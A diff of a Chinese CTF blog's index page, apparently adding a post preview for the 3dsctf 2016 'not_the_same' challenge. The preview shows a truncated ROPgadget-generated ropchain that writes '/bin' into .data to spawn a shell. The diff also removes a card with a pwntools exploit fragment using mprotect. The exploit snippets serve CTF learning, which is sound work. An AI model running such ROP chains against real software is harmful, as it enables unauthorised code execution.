@@ -192,6 +192,29 @@
             
 
 <div class="post-preview">
+    <a href="https://mrbelieve.tech/post/ropgadget-not_the_same_3dsctf_2016/">
+        <h2 class="post-title">
+            ROPgadget-not_the_same_3dsctf_2016
+        </h2>
+	
+        <div class="post-content-preview">
+	
+            ROPgadget --binary not_the_same_3dsctf_2016 --ropchain 自动生成 from struct import pack p = &#39;&#39; p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret p += &#39;/bin&#39; p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080eb064) # @
+       
+        </div>
+    </a>
+    <p class="post-meta">
+    
+        Posted by Mr.Be1ieVe on Tuesday, January 14, 2020
+        
+        
+    
+    </p>
+
+</div>
+<hr>
+
+<div class="post-preview">
     <a href="https://mrbelieve.tech/post/awd%E5%87%86%E5%A4%87/">
         <h2 class="post-title">
             AWD准备
@@ -269,29 +292,6 @@
         <div class="post-content-preview">
 	
             int func() { int result; // eax char v1; // [rsp+0h] [rbp-30h] float v2; // [rsp+2Ch] [rbp-4h] v2 = 0.0; puts(&#34;Let&#39;s guess the number.&#34;); gets(&amp;v1); if ( v2 == 11.28125 ) result = system(&#34;cat /flag&#34;); else result = puts(&#34;Its value should be 11.28125&#34;); return result; } 看见==我还尝试了一下&rsquo;a&rsqu
-       
-        </div>
-    </a>
-    <p class="post-meta">
-    
-        Posted by Mr.Be1ieVe on Monday, January 13, 2020
-        
-        
-    
-    </p>
-
-</div>
-<hr>
-
-<div class="post-preview">
-    <a href="https://mrbelieve.tech/post/get_started_3dsctf_2016/">
-        <h2 class="post-title">
-            get_started_3dsctf_2016
-        </h2>
-	
-        <div class="post-content-preview">
-	
-            mprotect函数原型： int mprotect(void *addr, size_t len, int prot); addr 内存启始地址 len 修改内存的长度 prot 内存的权限 [ 所以得到exp: from pwn import * elf = ELF(&#39;./get_started_3dsctf_2016&#39;) sh = elf.process() #sh = remote(&#39;node3.buuoj.cn&#39;,27037) pop3_ret = 0x804951D #为了后
        
         </div>
     </a>
@@ -444,6 +444,8 @@
                
             
                
+            
+               
                     <a href="/tags/xray" title="xray">
                         xray
                     </a>
@@ -473,6 +475,8 @@
                     <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" title="学习笔记">
                         学习笔记
                     </a>
+               
+            
                
             
                
